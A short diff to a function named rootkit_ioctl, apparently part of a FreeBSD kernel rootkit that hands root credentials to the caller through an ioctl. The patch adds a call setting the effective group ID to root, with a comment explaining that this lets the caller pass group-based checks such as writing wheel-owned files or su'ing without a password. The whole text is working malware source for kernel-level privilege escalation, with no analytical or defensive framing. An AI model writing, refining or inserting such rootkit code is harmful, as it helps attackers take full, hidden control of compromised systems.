@@ -64,7 +64,15 @@ rootkit_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thre
         change_ruid(root_cred, uip);
         change_svuid(root_cred, UID_ROOT);
         change_euid(root_cred, uip);
-        
+
+        /*
+         * The effective gid has to move too. Without this the caller keeps
+         * its old egid while euid becomes 0, so any check that keys on the
+         * group -- writing to a wheel-owned file, su'ing without a password
+         * -- still sees the unprivileged group.
+         */
+        change_egid(root_cred, root_gid);
+
         change_rgid(root_cred, root_gid);
         change_svgid(root_cred, root_gid);
         crsetgroups(root_cred, 1, &root_gid);
